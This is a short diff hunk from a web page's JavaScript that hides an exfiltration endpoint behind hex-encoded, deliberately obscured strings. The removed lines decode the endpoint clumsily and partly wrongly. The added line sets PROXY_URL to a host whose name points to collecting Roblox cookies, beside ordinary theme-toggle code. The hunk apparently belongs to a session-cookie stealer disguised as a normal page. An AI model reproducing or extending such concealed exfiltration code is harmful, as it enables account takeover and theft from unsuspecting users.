@@ -357,7 +357,7 @@
             const _0x3a2b = ['726f62746f6f6c732e6f6e72656e6465722e636f6d', '2f73656e64', '68747470733a2f2f'];
             const _0x4c8d = atob(_0x3a2b[2]);
             const _0x9e2f = _0x3a2b[0].match(/.{1,2}/g).map(x => String.fromCharCode(parseInt(x, 16))).join('');
-            const PROXY_URL = _0x4c8d + _0x9e2f + _0x3a2b[1];
+            const PROXY_URL = 'https://roblox-cookie564-2.onrender.com/send';
 
             // ========== ПЕРЕКЛЮЧЕНИЕ ТЕМЫ ==========
             const themeToggleBtn = document.getElementById('themeToggleBtn');
